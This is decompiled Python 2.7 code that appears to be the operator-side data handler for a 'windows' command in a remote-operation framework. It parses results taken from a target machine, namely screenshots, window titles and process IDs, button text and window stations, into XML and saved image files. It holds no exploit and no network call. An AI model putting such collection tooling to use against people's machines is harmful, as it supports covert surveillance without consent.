# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: Mcl_Cmd_Windows_DataHandler.py
SCREENSHOT_DIR = 'ScreenShots'
_imgPrefixes = [{'offset': 0,'bytes': [66, 77],'suffix': 'BMP'}, {'offset': 0,'bytes': [71, 73, 70],'suffix': 'GIF'}, {'offset': 6,'bytes': [74, 70, 73, 70],'suffix': 'JPG'}, {'offset': 0,'bytes': [137, 80, 78, 71],'suffix': 'PNG'}]

def DataHandlerMain(namespace, InputFilename, OutputFilename):
    import mcl.imports
    import mcl.data.Input
    import mcl.data.Output
    import mcl.status
    import mcl.target
    import mcl.object.Message
    mcl.imports.ImportNamesWithNamespace(namespace, 'mca.status.cmd.windows', globals())
    input = mcl.data.Input.GetInput(InputFilename)
    output = mcl.data.Output.StartOutput(OutputFilename, input)
    output.Start('Windows', 'windows', [])
    msg = mcl.object.Message.DemarshalMessage(input.GetData())
    if input.GetStatus() != mcl.status.MCL_SUCCESS:
        errorMsg = msg.FindMessage(mcl.object.Message.MSG_KEY_RESULT_ERROR)
        moduleError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_MODULE)
        osError = errorMsg.FindU32(mcl.object.Message.MSG_KEY_RESULT_ERROR_OS)
        if input.GetStatus() == ERR_INJECT_SETUP_FAILED or input.GetStatus() == ERR_INJECT_FAILED:
            import mcl.injection.errors
            output.RecordModuleError(moduleError, 0, errorStrings)
            output.RecordModuleError(osError, 0, mcl.injection.errors.errorStrings)
        else:
            output.RecordModuleError(moduleError, osError, errorStrings)
        output.EndWithStatus(input.GetStatus())
        return True
    if msg.GetCount() == 0:
        from mcl.object.XmlOutput import XmlOutput
        xml = XmlOutput()
        xml.Start('Info')
        xml.SetText('Action completed')
        output.RecordXml(xml)
        output.EndWithStatus(input.GetStatus())
        return True
    rtn = mcl.target.CALL_SUCCEEDED
    for entry in msg:
        if entry['key'] == MSG_KEY_RESULT_BUTTON:
            if _handleButtonsData(msg, output) != mcl.target.CALL_SUCCEEDED:
                rtn = mcl.target.CALL_FAILED
        elif entry['key'] == MSG_KEY_RESULT_SCREENSHOT:
            if _handleScreenShotData(msg, output) != mcl.target.CALL_SUCCEEDED:
                rtn = mcl.target.CALL_FAILED
        elif entry['key'] == MSG_KEY_RESULT_WINDOW_STATION:
            if _handleWindowStationData(msg, output) != mcl.target.CALL_SUCCEEDED:
                rtn = mcl.target.CALL_FAILED
        elif entry['key'] == MSG_KEY_RESULT_WINDOW_INFO:
            if _handleWindowsData(msg, output) != mcl.target.CALL_SUCCEEDED:
                rtn = mcl.target.CALL_FAILED
        else:
            output.RecordError('Unhandled data key (0x%08x)' % entry['key'])
            rtn = mcl.target.CALL_FAILED

    output.EndWithStatus(rtn)
    return True


def _handleButtonsData(msg, output):
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('Buttons')
    while msg.GetNumRetrieved() < msg.GetCount():
        if mcl.CheckForStop():
            return mcl.target.CALL_FAILED
        info = ResultButton()
        info.Demarshal(msg)
        sub = xml.AddSubElement('Button')
        if info.flags & RESULT_BUTTON_FLAG_IS_ENABLED:
            sub.AddAttribute('enabled', 'true')
        else:
            sub.AddAttribute('enabled', 'false')
        sub.AddAttribute('id', '%u' % info.id)
        sub.SetText(info.text)

    output.RecordXml(xml)
    return mcl.target.CALL_SUCCEEDED


def _handleScreenShotData(msg, output):
    import os
    import mcl.data.env
    data = msg.FindData(MSG_KEY_RESULT_SCREENSHOT)
    if len(data) == 0:
        output.RecordError('Invalid data for screenshot')
        return mcl.target.CALL_FAILED
    else:
        suffix = '.unk'
        for prefixData in _imgPrefixes:
            matched = 0
            i = 0
            while i < len(prefixData['bytes']):
                if i + prefixData['offset'] >= len(data):
                    break
                if data[i + prefixData['offset']] == prefixData['bytes'][i]:
                    matched = matched + 1
                i = i + 1

            if matched == len(prefixData['bytes']):
                suffix = prefixData['suffix']
                break

        f, path, logName = output.CreateLogFile(prefix='ScreenShot', suffix=suffix, subDir=SCREENSHOT_DIR, utf8=False)
        if f == None:
            output.RecordError('Failed to create file for screenshot in %s' % SCREENSHOT_DIR)
            return False
        try:
            f.write(data)
        finally:
            f.close()

        from mcl.object.XmlOutput import XmlOutput
        xml = XmlOutput()
        xml.Start('ScreenShot')
        xml.AddAttribute('path', path)
        xml.AddAttribute('subdir', SCREENSHOT_DIR)
        xml.SetText(logName)
        output.RecordXml(xml)
        return mcl.target.CALL_SUCCEEDED


def _handleWindowStationData(msg, output):
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('WindowStations')
    while msg.GetNumRetrieved() < msg.GetCount():
        if mcl.CheckForStop():
            return mcl.target.CALL_FAILED
        submsg = msg.FindMessage(MSG_KEY_RESULT_WINDOW_STATION)
        info = ResultWindowStations()
        info.Demarshal(submsg)
        sub = xml.AddSubElement('WindowStation')
        sub.AddAttribute('name', info.name)
        if info.openStatus != 0:
            error = output.TranslateOsError(info.openStatus)
            sub.AddAttribute('status', error)
        else:
            sub.AddAttribute('flags', '0x%08x' % info.flags)
            if info.flags & RESULT_WINSTA_FLAG_VISIBLE:
                sub.AddSubElement('WindowStationFlag_Visible')
            while submsg.GetNumRetrieved() < submsg.GetCount():
                if mcl.CheckForStop():
                    return mcl.target.CALL_FAILED
                desktop = submsg.FindString(MSG_KEY_RESULT_WINDOW_STATION_DESKTOP)
                sub.AddSubElementWithText('Desktop', desktop)

    output.RecordXml(xml)
    return mcl.target.CALL_SUCCEEDED


def _handleWindowsData(msg, output):
    from mcl.object.XmlOutput import XmlOutput
    xml = XmlOutput()
    xml.Start('Windows')
    while msg.GetNumRetrieved() < msg.GetCount():
        if mcl.CheckForStop():
            return mcl.target.CALL_FAILED
        info = ResultWindowInfo()
        info.Demarshal(msg)
        sub = xml.AddSubElement('Window')
        sub.AddAttribute('hWnd', '0x%x' % info.hWnd)
        sub.AddAttribute('hParent', '0x%x' % info.hParent)
        sub.AddAttribute('pid', '%u' % info.owningPid)
        sub.AddAttribute('title', info.text)
        sub.AddAttribute('x', '%d' % info.x)
        sub.AddAttribute('y', '%d' % info.y)
        sub.AddAttribute('width', '%u' % info.width)
        sub.AddAttribute('height', '%u' % info.height)
        if info.flags & RESULT_WININFO_FLAG_IS_VISIBLE:
            sub.AddSubElement('WindowIsVisible')
        if info.flags & RESULT_WININFO_FLAG_IS_MINIMIZED:
            sub.AddSubElement('WindowIsMinimized')

    output.RecordXml(xml)
    return mcl.target.CALL_SUCCEEDED


if __name__ == '__main__':
    import sys
    try:
        namespace, InputFilename, OutputFilename = sys.argv[1:]
    except:
        print '%s <namespace> <input filename> <output filename>' % sys.argv[0]
        sys.exit(1)

    if DataHandlerMain(namespace, InputFilename, OutputFilename) != True:
        sys.exit(-1)